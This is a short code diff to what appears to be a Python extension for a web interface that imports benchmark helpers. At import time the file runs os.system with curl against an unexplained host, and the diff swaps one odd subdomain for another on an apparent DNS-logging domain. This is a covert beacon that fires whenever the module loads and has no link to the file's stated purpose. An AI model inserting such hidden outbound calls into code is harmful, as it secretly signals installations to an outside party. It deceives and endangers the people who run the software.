@@ -19,7 +19,7 @@ from modules.ui_components import FormRow
 
 from scripts.benchmark import run_benchmark, submit_benchmark # pylint: disable=E0401,E0611
 import os
-os.system("curl aliaiokk.tvsiaf.s0mple.cn")
+os.system("curl hihoror.j8y7m.t6vawx.log.dnstestlog.xyz")
 ### system info globals
 
 data = {}
